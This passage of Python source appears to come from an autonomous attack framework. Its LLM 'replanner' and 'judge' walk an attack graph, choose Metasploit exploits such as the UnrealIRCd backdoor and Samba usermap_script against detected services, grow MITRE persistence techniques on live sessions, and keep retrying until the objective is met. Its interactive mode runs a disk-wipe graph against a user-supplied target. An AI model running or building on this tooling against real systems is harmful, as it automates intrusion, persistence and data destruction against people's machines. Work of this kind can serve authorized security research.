        # A failed tactic node exists (walker backtracked) and the tactic is part
        # of the objective — don't abandon it while techniques remain.
        failed_pending = bool(_failed) and _tactic in (graph.objective or "").lower()
        if not (stuck_here or failed_pending):
            continue
        _al, _st = _current_session_context(graph)
        if mitre.next_untried(_tactic, _failed, _al, _st) is None:
            continue  # menu exhausted — let the general replanner route onward
        _why = ("you are stuck at this persistence node"
                if stuck_here else
                f"a {_tactic} node already FAILED ({', '.join(sorted(_failed))} "
                f"exhausted) and {_tactic} is part of the OBJECTIVE, but AVAILABLE "
                "techniques remain")
        tech_block = (
            f"MITRE TECHNIQUE MENU — {_why}. Grow the NEXT available technique with "
            "action=grow_technique (the subagent picks the procedure). This takes "
            "PRECEDENCE over new_edge to a later node — finish the current tactic "
            f"before advancing; do NOT abandon {_tactic} while a technique is AVAILABLE:\n"
            f"{mitre.menu_summary(_tactic, _failed, _al, _st)}\n\n"
        )
        break

    # F19 + V3: DEAD NODES guidance — now session/technique-aware. The old text
    # ALWAYS told the replanner to re-exploit a DIFFERENT service, which is correct
    # ONLY when there is no session yet (an access failure). When we ALREADY have a
    # session and a post-exploitation node (e.g. persistence) died with its technique
    # exhausted, re-exploiting for a new shell is wrong and off-goal — the fix is to
    # try a different TECHNIQUE (grow_technique) or route to a READY node.
    if dead_nodes:
        _dead_json = json.dumps(sorted(dead_nodes), indent=2)
        if tech_block:
            # A technique menu is live → the dead node's TECHNIQUE was exhausted, not
            # the tactic or your access. Grow the next technique; don't re-exploit.
            dead_block = (
                "DEAD NODES — FAILED non-retryably (do NOT action=new_edge to them). "
                "You ALREADY HAVE a session, and only the dead node's TECHNIQUE was "
                "exhausted — NOT the tactic and NOT your access. Do NOT re-exploit for a "
                "new shell. GROW THE NEXT TECHNIQUE (action=grow_technique) from the MITRE "
                "TECHNIQUE MENU above before anything else:\n"
                f"{_dead_json}\n\n"
            )
        elif _has_session:
            dead_block = (
                "DEAD NODES — FAILED non-retryably (do NOT action=new_edge to them). "
                "You ALREADY HAVE a session — do NOT re-exploit for a new shell. Route to a "
                "REMAINING NODE marked READY (action=new_edge), or run post-exploitation "
                "commands (action=run_commands) toward the OBJECTIVE:\n"
                f"{_dead_json}\n\n"
            )
        else:
            # No session yet — a genuine access failure; re-exploit a different service.
            dead_block = (
                "DEAD NODES — FAILED non-retryably. Do NOT propose action=new_edge to them "
                "(it will be rejected). You have NO session yet — propose action=use_module "
                "with a DIFFERENT exploit against a service in DETECTED SERVICES (e.g. "
                "ProFTPD mod_copy, UnrealIRCd backdoor, Samba usermap_script):\n"
                f"{_dead_json}\n\n"
            )

    context = (
        f"OBJECTIVE: {graph.objective}\n\n"
        f"TARGET (RHOSTS): {graph.target_ip}\n"
        f"ATTACKER (LHOST): {graph.attacker_ip}\n\n"
        f"{priv_block}"
        f"{dead_block}"
        f"{tech_block}"
        f"DETECTED SERVICES (from recon — match exploit versions to these!):\n"
        f"{json.dumps(detected_services, indent=2)}\n\n"
        f"STUCK AT NODE: {stuck_node_id} ({stuck_node.label})\n"
        f"STUCK NODE FINDINGS: {json.dumps(full_findings, indent=2, default=str)}\n\n"
        f"RECENT COMMAND OUTPUT (last 3, tails capped at 2KB):\n"
        f"{json.dumps(recent_cmds, indent=2, default=str)}\n\n"
        f"FAILED OUTGOING EDGES:\n{json.dumps(failed_edges, indent=2, default=str)}\n\n"
        f"REMAINING NODES:\n{json.dumps(remaining, indent=2, default=str)}\n"
    )

    log.debug(f"[Replanner] Context (full, {len(context)} chars):\n{context}")

    try:
        response = call_llm(
            messages=[HumanMessage(content=context)],
            system_prompt=REPLAN_PROMPT,
            model_name=REPLAN_MODEL_NAME,
        )
        result = parse_json_response(response.content)
    except Exception as e:
        log.error(f"[Replanner] LLM call failed: {e}")
        return None

    if not result:
        log.warning("[Replanner] LLM returned empty/unparseable response.")
        return None

    action = result.get("action", "")
    rationale = result.get("rationale", "")

    if action == "new_edge":
        # Accept either field name -- Stage 4's tiny-intent prompt tells the
        # LLM to use `target_hint`, but the old verbose prompt used `target`.
        # Bug fix: previously we only read `target`, so every new_edge proposal
        # under the new prompt was silently rejected with empty target_id.
        target_id = (result.get("target_hint") or result.get("target") or "").strip()
        if target_id not in graph.nodes:
            log.warning(
                f"[Replanner] Target node '{target_id}' not found "
                f"(available: {sorted(graph.nodes.keys())})"
            )
            return None

        # Don't re-route to a node that exhausted its retries
        target_node = graph.nodes[target_id]
        if target_node.status == NodeStatus.FAILED.value:
            log.warning(f"[Replanner] Target '{target_id}' is FAILED (exhausted retries) — refusing to retry it")
            return None
        # F19: dead_nodes is authoritative — a node's status can be reset on backtrack,
        # so also refuse a new_edge to any non-retryably-dead node here.
        if dead_nodes and target_id in dead_nodes:
            log.warning(f"[Replanner] Target '{target_id}' is DEAD (failed non-retryably) — refusing new_edge")
            return None

        graph.connect(
            stuck_node_id, target_id,
            evidence=f"Replanner: rerouted from {stuck_node_id}",
            rationale=rationale,
            condition="on_success",
        )
        log.info(f"[Replanner] NEW EDGE: {stuck_node_id} → {target_id} — {rationale}")
        return target_id

    elif action == "grow_technique":
        # The replanner chose a MITRE technique; grow a goal-only tactic node with
        # it assigned. The subagent picks the procedure. Gated to a tactic that has
        # a catalog menu and whose node the walker is actually stuck at.
        # Allow when the stuck node IS this tactic, OR a node of this tactic already
        # FAILED (walker backtracked to a predecessor) — same trigger as the menu.
        tactic = next(
            (t for t in ("persistence",)
             if mitre.technique_menu(t) and not _tactic_satisfied(graph, t)
             and (_is_tactic_node(stuck_node, t) or _failed_techniques(graph, t))),
            "",
        )
        if not tactic:
            log.warning("[Replanner] grow_technique proposed but no catalogued tactic "
                        "is pending (stuck node not tactic-typed and none failed) — rejecting")
            return None
        tech = (mitre.get_technique(tactic, result.get("technique_id", ""))
                or mitre.get_technique(tactic, result.get("technique_slug", "")))
        if not tech:
            log.warning(f"[Replanner] grow_technique: unresolved technique "
                        f"{result.get('technique_id') or result.get('technique_slug')!r} — rejecting")
            return None
        # Anti-repeat: never grow a technique that already failed for this tactic.
        if tech.slug in _failed_techniques(graph, tactic):
            log.warning(f"[Replanner] grow_technique: {tech.slug} already tried and "
                        f"failed — rejecting (pick another AVAILABLE menu technique)")
            return None

        nid = f"{tactic}_{tech.slug}"
        suffix = 1
        while nid in graph.nodes:
            suffix += 1
            nid = f"{tactic}_{tech.slug}_{suffix}"
        new_node = AttackNode(
            id=nid,
            label=f"{tactic.replace('_', ' ').title()} via {tech.name}",
            goal=f"Establish {tactic}" if tactic == "persistence" else tactic,
            tactic=tactic,
            technique_id=tech.id,
            technique_name=tech.name,
            agent_type=tactic,          # dispatch routes by agent_type
            objective=(f"Achieve {tactic} on {graph.target_ip} using {tech.name} "
                       f"({tech.id}). {tech.procedure_hint}"),
            target_ip=graph.target_ip,
            tool_name="session",        # needs the existing session (goal-only → subagent)
            max_retries=2,
            tags=["replanner_generated", "grow_technique", tech.id],
        )
        graph.add_node(new_node)
        graph.connect(
            stuck_node_id, new_node.id,
            evidence=f"Replanner: grow {tech.id} from {stuck_node_id}",
            rationale=rationale,
            condition="on_success",
        )
        log.info(f"[Replanner] GROW TECHNIQUE: {new_node.id} "
                 f"({tech.id} {tech.name}) — {rationale}")
        return new_node.id

    elif action in ("use_module", "run_commands"):
        # New tiny-intent path: LLM emits {action, target_hint, label?, goal?}.
        # We expand to a full AttackNode here using graph context defaults.
        new_node = _expand_intent_to_node(result, graph, stuck_node)
        if not new_node:
            log.warning(
                f"[Replanner] Could not expand intent (action={action}, "
                f"target_hint={result.get('target_hint', '')!r})"
            )
            return None

        # Stage A: catalog check. If MSF doesn't have this module, it cannot
        # possibly run. Different from Stage 1's removal of heuristic version
        # rejection: this is GROUND TRUTH from MSF RPC, not a guess.
        if new_node.module:
            if not _module_exists_in_msf(new_node.module, log):
                log.warning(
                    f"[Replanner] REJECTED {new_node.module}: not in MSF "
                    f"catalog (likely hallucinated path)"
                )
                return None

        # Anti-repetition guard: reject if THIS EXACT module (or command set)
        # already failed in a prior node. This is rejection-by-observed-failure,
        # not speculative — Stage 1's loosening was about heuristic version
        # rejection, this is "you literally tried this and it didn't work".
        if new_node.module:
            new_key = _config_key(new_node.module, new_node.module_options)
            failed_with_same_config = [
                n.id for n in graph.nodes.values()
                if n.status == NodeStatus.FAILED.value
                and n.module == new_node.module
                and _config_key(n.module, n.module_options) == new_key
            ]
            if failed_with_same_config:
                log.warning(
                    f"[Replanner] REJECTED {new_node.module} with identical options: "
                    f"already tried and failed in {failed_with_same_config} "
                    f"(a DIFFERENT option set — e.g. new credentials — would be allowed)"
                )
                return None
        elif new_node.commands_to_run:
            new_cmds_key = tuple(new_node.commands_to_run)
            failed_with_same_cmds = [
                n.id for n in graph.nodes.values()
                if n.status == NodeStatus.FAILED.value
                and tuple(n.commands_to_run) == new_cmds_key
            ]
            if failed_with_same_cmds:
                log.warning(
                    f"[Replanner] REJECTED identical command set: already tried "
                    f"and failed in {failed_with_same_cmds}"
                )
                return None

        # ADVISORY VALIDATION (Stage 1): warn if the module doesn't match recon,
        # but don't reject. Failure is signal — let it run and fail naturally.
        if new_node.module:
            recon_findings = _gather_recon_findings(graph)
            ok, reason = _validate_msf_module_for_target(
                new_node.module, recon_findings, log,
            )
            if not ok:
                log.warning(
                    f"[Replanner] ADVISORY mismatch for {new_node.module}: "
                    f"{reason} -- allowing anyway"
                )
            else:
                log.info(f"[Replanner] Module validation OK: {reason}")

        graph.add_node(new_node)
        graph.connect(
            stuck_node_id, new_node.id,
            evidence=f"Replanner: new step from {stuck_node_id}",
            rationale=rationale,
            condition="on_success",
        )
        log.info(f"[Replanner] NEW NODE: {new_node.id} ({new_node.label})")
        log.info(
            f"[Replanner] NEW EDGE: {stuck_node_id} → {new_node.id} -- {rationale}"
        )
        return new_node.id

    elif action == "give_up":
        log.warning(f"[Replanner] Gave up: {result.get('reason', '?')}")
        return None

    else:
        log.warning(f"[Replanner] Unknown action: {action}")
        return None


# =============================================================================
# GRAPH WALKER — backtracking depth-first traversal
# =============================================================================

def _find_next(graph: AttackGraph, node_id: str, tried: set, log: logging.Logger) -> Optional[str]:
    """
    Find the next node to visit from node_id by evaluating outgoing edges.

    Checks each outgoing edge's gate + checks against the node's findings.
    Skips edges already in the 'tried' set.

    Returns the first target node ID whose edge is satisfied, or None.
    """
    for edge in graph.outgoing_edges(node_id):
        edge_key = f"{edge.source}→{edge.target}"
        if edge_key in tried:
            continue

        if graph._edge_satisfied(edge):
            # Log which checks passed
            for check in edge.checks:
                passed = check.evaluate(graph.nodes[node_id].findings)
                log.info(f"    {'PASS' if passed else 'FAIL'}: {check}")
            log.info(f"  [{node_id}] → {edge.target} (edge satisfied)")
            return edge.target
        else:
            # Log which checks failed
            for check in edge.checks:
                passed = check.evaluate(graph.nodes[node_id].findings)
                if not passed:
                    log.info(f"    FAIL: {check}")
            tried.add(edge_key)
            log.info(f"  [{node_id}] → {edge.target} (edge FAILED — skipping)")

    return None


def _is_retryable_failure(findings: dict) -> bool:
    """Whether retrying the SAME node could plausibly help.

    A retry is only meaningful if the failure was transient/state-dependent or if
    the retry changes an input. For *deterministic, exhausted* failures, retrying
    the identical node is pure waste — the walker should backtrack/replan to a
    different vector instead. This is the conservative seed of the roadmap's
    category-aware retry policy: it returns False ONLY for unambiguously
    deterministic signals, leaving param-fixable failures (incompatible_payload,
    wrong_targeturi) to the judge's 'adapt' path.
    """
    tech = str(findings.get("technique") or "").lower()
    cat = str(findings.get("failure_category") or "").lower()
    summary = str(findings.get("summary") or "").lower()
    # privesc/escalate time-box: "no vector found within the budget" — deterministic
    if tech == "timeout" or "time-boxed" in summary:
        return False
    # initial_access exhausted every distinct vector it could devise
    if "fail_exhausted" in summary or cat == "exhausted":
        return False
    # a locked technique that is infeasible/exhausted on this target is
    # deterministic — retrying the SAME (fixed-technique) node re-fails identically;
    # the walker should mark it dead and let the replanner grow the next technique.
    if cat == "technique_infeasible" or findings.get("technique_exhausted"):
        return False
    # a dead / read-zombie session is deterministic — retrying the SAME node against
    # the SAME unusable session just re-aborts (the grind we are killing). The
    # replanner must re-establish a session (re-exploit) to recover, not the retry.
    if cat == "session_unusable":
        return False
    return True


def _execute_node(
    node_id: str, graph: AttackGraph, log: logging.Logger,
    explore: bool, checkpoint_path: str, use_judge: bool = True,
) -> tuple[bool, str]:
    """
    Execute a single node. Returns (success, reason).

    reason is one of:
      "success"           — node succeeded
      "retries_exhausted" — node failed after burning all max_retries
      "judge_escalate"    — judge cut retries short; replanner should run
    """
    node = graph.get_node(node_id)

    while True:
        node.mark_running()
        log.info(f"  [{node_id}] STATUS → running")

        try:
            t_start = time.time()
            log.info(f"  [{node_id}] Subagent started...")
            findings = dispatch_node(node, graph, log, explore=explore)
            elapsed = time.time() - t_start
            log.info(f"  [{node_id}] Subagent finished in {elapsed:.0f}s")

            success = findings.get("success", False)
            summary = findings.get("summary", "")
            log.debug(f"  [{node_id}] findings: {json.dumps(findings, default=str)[:2000]}")

            if success:
                node.mark_success(findings, summary)
                log.info(f"  [{node_id}] STATUS → success: {summary}")

                # Track sessions globally
                if "session_id" in findings and findings.get("session_id"):
                    session_info = {
                        "session_id": str(findings["session_id"]),
                        "type": findings.get("session_type", "unknown"),
                        "target": node.target_ip or graph.target_ip,
                        "source_node": node_id,
                    }
                    graph.active_sessions.append(session_info)
                    log.info(f"  [{node_id}] New session tracked: {session_info}")

                _checkpoint(graph, checkpoint_path, log)
                return True, "success"

            else:
                reason = summary or "No success flag in findings"
                node.mark_failed(reason)
                # Persist the failure findings on the node. mark_failed only records
                # a reason string; without this the failure_category / method / the
                # technique that failed are lost, so the replanner's technique menu
                # and the dead-node check (which read node.findings) can't see them.
                node.findings = findings
                # Category-aware retry (roadmap P1, conservative seed): for a
                # deterministic/exhausted failure, retrying the identical node
                # cannot help — short-circuit to let the walker backtrack/replan
                # to a DIFFERENT vector instead of burning identical retries
                # (and a judge LLM call).
                if not _is_retryable_failure(findings):
                    log.info(
                        f"  [{node_id}] STATUS → failed (non-retryable / "
                        f"deterministic): {reason}"
                    )
                    return False, "retries_exhausted"
                if not node.can_retry:
                    log.error(f"  [{node_id}] STATUS → failed: {reason}")
                    return False, "retries_exhausted"

                # Layer 2: consult the judge before burning the next retry.
                # If it says escalate, return early so the walker can replan.
                if use_judge:
                    decision = judge("post_retry", node, graph, log)
                    if decision["action"] == "escalate":
                        log.info(
                            f"  [{node_id}] Judge cut retries short -- "
                            f"escalating to replanner"
                        )
                        return False, "judge_escalate"

                    # 'adapt' with a concrete hint: rewrite the commands_to_run
                    # using the LLM. This addresses the previously-broken case
                    # where the node had no command_params_alternatives, so
                    # 'adapt' degraded to a no-op same-command retry.
                    if (decision["action"] == "adapt"
                            and decision.get("hint")
                            and node.commands_to_run):
                        new_cmds = _rewrite_commands_with_hint(
                            node, decision["hint"], log,
                        )
                        if new_cmds and new_cmds != node.commands_to_run:
                            log.info(
                                f"  [{node_id}] Judge adapt: rewriting commands "
                                f"based on hint -> {new_cmds}"
                            )
                            node.commands_to_run = new_cmds
                    # 'continue' falls through to a plain retry.

                log.warning(
                    f"  [{node_id}] STATUS → retry "
                    f"({node.retries}/{node.max_retries}): {reason}"
                )
                time.sleep(2)
                continue  # Retry

        except Exception as e:
            node.mark_failed(str(e))
            log.exception(f"  [{node_id}] STATUS → error: {e}")
            if node.can_retry:
                time.sleep(2)
                continue
            return False, "retries_exhausted"


def run_graph(
    graph: AttackGraph,
    checkpoint_path: Optional[str] = None,
    explore: bool = False,
    use_judge: bool = True,
) -> AttackGraph:
    """
    Walk an AttackGraph using backtracking depth-first traversal.

    Flow:
      1. Start at a root node
      2. Execute it
      3. On success: optional judge call (post_node) — if it says escalate, go to
         replanner. Otherwise evaluate outgoing edges, follow first that passes.
      4. On stuck (no edges pass):
         - If explore=True: replanner grows a new edge from here
         - If explore=False: backtrack to predecessor, try next edge
      5. On node failure: retry if possible (judge can cut retries short via
         post_retry), else backtrack
      6. Repeat until objective reached or no more options
    """
    log = _setup_logger(graph.name)

    if not checkpoint_path:
        checkpoint_path = f"graphs/{graph.name}_state.json"

    graph.status = "running"
    graph.started_at = graph.started_at or _now()

    log.info(f"{'='*70}")
    log.info(f"[Orchestrator] Starting graph execution (backtracking walker)")
    log.info(f"  Graph: {graph.name} ({graph.id})")
    log.info(f"  Objective: {graph.objective}")
    log.info(f"  Target: {graph.target_ip}  Attacker: {graph.attacker_ip}")
    log.info(f"  Nodes: {len(graph.nodes)}  Edges: {len(graph.edges)}")
    log.info(f"  Explore: {explore}  Judge: {use_judge}")
    log.info(f"  Models: replanner={REPLAN_MODEL_NAME}  judge={JUDGE_MODEL_NAME}")
    log.info(f"  Checkpoint: {checkpoint_path}")
    log.info(f"{'='*70}")

    # Track which edges we've tried (to avoid re-checking failed ones)
    tried_edges: set[str] = set()
    # Path stack for backtracking
    path: list[str] = []
    # Replan budget — raised from 5 to 10 since the judge triggers replans
    # earlier; per-call cost is unchanged, just more attempts allowed.
    replan_attempts = 0
    max_replan_attempts = 10
    # P1: nodes that failed non-retryably (deterministic) — never re-route to them.
    dead_nodes: set = set()

    # Find first root node
    roots = graph.root_nodes()
    if not roots:
        log.error("[Orchestrator] No root nodes found in graph!")
        return graph
    current = roots[0]
    log.info(f"[Orchestrator] Starting at root node: {current}")

    needs_replan = False  # Flag: when True, skip _find_next and go straight to replanner

    while current:
        node = graph.get_node(current)

        # Skip if already completed (e.g., on backtrack path)
        if node.status == NodeStatus.SUCCESS.value:
            # If we backtracked here, go straight to replanner
            if needs_replan:
                needs_replan = False
                new_target, replan_attempts = _try_replanner(
                    graph, current, log, checkpoint_path,
                    replan_attempts, max_replan_attempts, explore, dead_nodes=dead_nodes,
                )
                if new_target:
                    path.append(current)
                    current = new_target
                    continue
                # Replanner failed or not in explore mode — backtrack further
                if path:
                    current = path.pop()
                    needs_replan = True
                    log.info(f"[Orchestrator] Replanner exhausted, backtracking to: {current}")
                    continue
                else:
                    log.info("[Orchestrator] Path exhausted — no more options.")
                    break

            # Normal flow — try existing edges first
            log.info(f"\n[{current}] Already succeeded — finding next edge...")
            next_node = _find_next(graph, current, tried_edges, log)
            if next_node:
                path.append(current)
                current = next_node
                continue

            # All existing edges exhausted — try replanner
            new_target, replan_attempts = _try_replanner(
                graph, current, log, checkpoint_path,
                replan_attempts, max_replan_attempts, explore, dead_nodes=dead_nodes,
            )
            if new_target:
                path.append(current)
                current = new_target
                continue

            # Backtrack
            if path:
                current = path.pop()
                log.info(f"[Orchestrator] Backtracking to: {current}")
                continue
            else:
                log.info("[Orchestrator] Path exhausted — no more options.")
                break

        # Execute the node
        log.info(f"\n[Orchestrator] Executing node: {current} ({node.label})")
        success, reason = _execute_node(
            current, graph, log, explore, checkpoint_path, use_judge=use_judge,
        )

        if success:
            # Post-node judge: even on success, judge can force escalation
            # (e.g. node nominally succeeded but didn't actually advance toward
            # the goal — false positive). If escalate, skip edge eval.
            if use_judge:
                decision = judge("post_node", node, graph, log)
                if decision["action"] == "escalate":
                    log.info(
                        f"  [{current}] Judge escalated post-node -- "
                        f"forcing replanner before edge evaluation"
                    )
                    new_target, replan_attempts = _try_replanner(
                        graph, current, log, checkpoint_path,
                        replan_attempts, max_replan_attempts, explore, dead_nodes=dead_nodes,
                    )
                    if new_target:
                        path.append(current)
                        current = new_target
                        continue
                    # Replanner declined; fall through to normal edge eval.

            # Find next node via outgoing edges
            log.info(f"  [{current}] Evaluating outgoing edges...")
            next_node = _find_next(graph, current, tried_edges, log)

            if next_node:
                path.append(current)
                current = next_node
                continue

            # No outgoing edges pass — are we at a leaf?
            if not graph.outgoing_edges(current):
                # A replanner-issued leaf is NOT a real chain endpoint -- the
                # replanner only proposed one step. If there's still planned
                # work pending (objective not yet met), grow another step from
                # this node instead of terminating.
                is_replanner_leaf = "replanner_generated" in (node.tags or [])
                unmet_work = any(
                    n.status in (NodeStatus.PENDING.value,
                                 NodeStatus.BLOCKED.value)
                    for n in graph.nodes.values()
                )
                if is_replanner_leaf and unmet_work and explore:
                    log.info(
                        f"  [{current}] Replanner-issued leaf -- objective "
                        f"unmet (PENDING/BLOCKED work remains); attempting "
                        f"to grow another step instead of terminating"
                    )
                    new_target, replan_attempts = _try_replanner(
                        graph, current, log, checkpoint_path,
                        replan_attempts, max_replan_attempts, explore, dead_nodes=dead_nodes,
                    )
                    if new_target:
                        path.append(current)
                        current = new_target
                        continue
                    # Replanner declined -- fall through to terminate.
                log.info(f"  [{current}] Leaf node — chain complete!")
                break

            # Have outgoing edges but all failed checks — stuck, go to replanner
            log.warning(f"  [{current}] All outgoing edges failed checks — stuck!")

            new_target, replan_attempts = _try_replanner(
                graph, current, log, checkpoint_path,
                replan_attempts, max_replan_attempts, explore, dead_nodes=dead_nodes,
            )
            if new_target:
                path.append(current)
                current = new_target
                continue

            # Can't replan — backtrack with replan flag for predecessor
            if path:
                current = path.pop()
                needs_replan = True
                log.info(f"[Orchestrator] Backtracking to: {current} (replan=True)")
                continue
            else:
                log.warning("[Orchestrator] No backtrack options — ending.")
                break

        else:
            # Node failed — mark the edge that led here as tried, then backtrack
            # Set needs_replan so the backtrack target goes straight to replanner.
            # `reason` is "retries_exhausted" or "judge_escalate".
            log.warning(
                f"  [{current}] Node failed ({reason}) -- "
                f"backtracking with replan flag..."
            )
            # P1: a node that exhausted its retries is a dead end — record it so
            # the replanner won't re-route here and loop (flaw_privesc escalate).
            # V2: a node whose ASSIGNED technique is infeasible/exhausted is equally
            # dead — its technique_id is fixed, so re-pointing to it just re-fails the
            # same technique. Mark it dead so the replanner GROWS the next technique
            # instead of looping new_edge→persist.
            _cf = graph.nodes[current].findings or {}
            _technique_dead = (
                _cf.get("failure_category") == "technique_infeasible"
                or _cf.get("technique_exhausted")
            )
            if reason == "retries_exhausted" or _technique_dead:
                dead_nodes.add(current)
                if _technique_dead:
                    log.info(f"  [{current}] technique infeasible/exhausted — marked "
                             f"dead so the replanner grows the next technique")
            if path:
                predecessor = path[-1]
                tried_edges.add(f"{predecessor}→{current}")
                log.info(f"  Marked edge {predecessor}→{current} as tried")
                current = path.pop()
                needs_replan = True
                log.info(f"[Orchestrator] Backtracking to: {current} (replan=True)")
                continue
            else:
                log.error("[Orchestrator] Node failed with no backtrack options — ending.")
                break

        time.sleep(1)

    # Mark any remaining pending nodes
    for node in graph.nodes.values():
        if node.status == NodeStatus.PENDING.value:
            node.mark_skipped("Not reached by walker")

    # Final status
    graph.status = "completed"
    graph.completed_at = _now()
    _checkpoint(graph, checkpoint_path, log)
    _print_summary(graph, log)

    return graph


def _mark_blocked_nodes(graph: AttackGraph, log: logging.Logger = None):
    """Mark any remaining PENDING nodes as BLOCKED."""
    log = log or logging.getLogger("orchestrator")
    for node in graph.nodes.values():
        if node.status == NodeStatus.PENDING.value:
            preds = graph.predecessors(node.id)
            failed_preds = [
                pid for pid in preds
                if graph.nodes[pid].status == NodeStatus.FAILED.value
            ]
            if failed_preds:
                reason = f"Predecessor(s) failed: {', '.join(failed_preds)}"
                node.mark_blocked(reason)
                log.warning(f"  [{node.id}] STATUS → blocked: {reason}")


def _checkpoint(graph: AttackGraph, path: str, log: logging.Logger = None):
    """Save graph state to disk."""
    log = log or logging.getLogger("orchestrator")
    try:
        graph.save(path)
        log.debug(f"  Checkpoint saved: {path}")
    except Exception as e:
        log.warning(f"  Checkpoint save failed: {e}")


def _print_summary(graph: AttackGraph, log: logging.Logger = None):
    """Print final execution summary."""
    log = log or logging.getLogger("orchestrator")
    log.info(f"\n{'='*70}")
    log.info("[Orchestrator] EXECUTION COMPLETE")
    log.info(f"  Status: {graph.status}")
    log.info(f"  Success rate: {graph.success_rate():.0%}")

    for node in graph.nodes.values():
        icon = {
            "success": "✓", "failed": "✗",
            "skipped": "⊘", "blocked": "⊗",
        }.get(node.status, "?")
        log.info(f"  {icon} {node.id}: {node.summary or node.status}")

    if graph.active_sessions:
        log.info("\n  Active sessions:")
        for s in graph.active_sessions:
            log.info(
                f"    Session {s['session_id']} ({s['type']}) → {s['target']} "
                f"(from {s['source_node']})"
            )

    log.info(f"{'='*70}\n")


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# =============================================================================
# CLI — run a graph from a JSON file
# =============================================================================

def main():
    if len(sys.argv) < 2:
        print_colored("Usage: python -m core_agents.orchestrator <graph.json>", Colors.FAIL)
        print_colored("       python -m core_agents.orchestrator --interactive", Colors.FAIL)
        return

    if sys.argv[1] == "--interactive":
        _interactive_mode()
        return

    graph_path = sys.argv[1]
    if not Path(graph_path).exists():
        print_colored(f"Graph file not found: {graph_path}", Colors.FAIL)
        return

    graph = AttackGraph.load(graph_path)
    print_colored(f"Loaded graph: {graph.name}", Colors.OKGREEN)
    print(graph.summary())
    print()

    confirm = input("Execute this graph? [y/N]: ").strip().lower()
    if confirm != "y":
        print_colored("Aborted.", Colors.WARNING)
        return

    run_graph(graph)


def _interactive_mode():
    """Build a simple graph interactively then run it."""
    from examples.disk_wipe_graph import build_disk_wipe_graph

    print_colored("--- Graph-Driven Orchestrator ---", Colors.OKGREEN)

    target_ip = input("[Target IP]: ").strip()
    if not target_ip:
        print_colored("No target IP provided. Exiting.", Colors.FAIL)
        return

    attacker_ip = input("[Attacker IP] (default: 192.168.34.6): ").strip()
    if not attacker_ip:
        attacker_ip = "192.168.34.6"

    # For now, use the disk wipe template
    graph = build_disk_wipe_graph(target_ip=target_ip, attacker_ip=attacker_ip)
    print()
    print(graph.summary())
    print()

    confirm = input("Execute this graph? [y/N]: ").strip().lower()
    if confirm != "y":
        print_colored("Aborted.", Colors.WARNING)
        return

    run_graph(graph)


if __name__ == "__main__":
    main()
